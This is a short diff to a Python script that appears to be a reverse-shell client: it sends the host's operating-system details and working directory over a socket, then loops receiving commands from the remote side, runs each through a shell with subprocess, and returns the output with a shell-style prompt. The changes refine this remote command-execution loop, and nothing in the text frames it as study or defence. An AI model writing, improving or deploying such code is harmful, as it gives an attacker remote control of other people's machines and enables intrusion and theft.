@@ -33,17 +33,17 @@ while True:
 
 oss = platform.system() + " " + platform.release() + " " + platform.version()
 s.send(oss.encode('ascii'))
+directory = os.getcwd()
+s.send(directory.encode('ascii'))
 
 while True:
-    directory = os.getcwd()
-    s.send(directory.encode('ascii'))
     command = s.recv(1024)
     if (command[:2].decode('ascii') == "cd"):
         os.chdir(command[3:].decode('ascii'))
-    elif (len(command.decode('ascii')) > 0):
+    if (len(command.decode('ascii')) > 0):
         cmd = subprocess.Popen([command[:].decode('utf-8')], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         output = cmd.stdout.read() + cmd.stderr.read()
         output_str = output.decode('ascii', 'ignore')
-        s.send(output_str.encode('ascii'))
+        s.send(output_str.encode('ascii') + os.getcwd().encode('ascii') + ">".encode('ascii'))
     else:
         s.close()
